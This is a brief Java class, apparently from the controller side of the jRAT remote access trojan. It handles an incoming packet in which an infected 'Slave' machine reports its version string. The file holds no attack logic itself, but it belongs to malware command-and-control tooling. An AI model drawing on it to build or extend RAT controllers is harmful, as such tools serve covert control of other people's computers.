package jrat.controller.packets.incoming;

import jrat.controller.Slave;

import java.io.DataInputStream;


public class Packet6InitVersion extends AbstractIncomingPacket {

	public void read(Slave slave, DataInputStream dis) throws Exception {
		String version = slave.readLine();
		slave.setVersion(version);
	}

}
